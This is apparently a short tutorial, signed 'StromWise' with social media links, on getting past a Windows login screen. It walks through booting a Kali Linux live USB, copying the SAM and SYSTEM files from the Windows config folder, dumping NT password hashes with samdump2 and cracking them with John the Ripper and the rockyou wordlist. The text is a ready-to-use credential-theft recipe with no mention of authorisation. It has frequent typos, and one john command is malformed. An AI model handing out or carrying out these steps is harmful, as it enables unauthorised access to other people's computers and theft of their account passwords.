Bypass windows login screen using Kali linux live bootable media/ using JOHN

Lets start:-

Create a kali linux live usb bootable media using Rufus.

Then insert the usb and restaqrt the system.

Enter the boot mnenu using F10 / F8 / F12 / F9 whatever your system has.

then staret the kali live system (First option).

once you boot into kali then open the drives containing windows file(C:) shown on the desktop.

open WINDOWS folder.

Open SYSTEM32 folder.

Open CONFIG folder.

search and COPY both SAM file & SYSTEM file to the desktop.

now run a terminal on desktop and type this command to dump the hashes for the files :-

samdump2 SYSTEM SAM >hash.txt       

john -w hash.txt --format=NT          (to crack the hash file using the default list)

locate rockyou                        (to locate the default rockyou wordlist)

sudo gunzip /usr/share/wordlists/rockyou.txt.gz           (to unzip the rockyou wordlist file"write the file path which is displayed on your system")

john -w="/usr/share/wordlists/rockyou.txt" hash.txt -format="NT"    (enter the full path of rockyou && cracking the password with this command.)












____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________
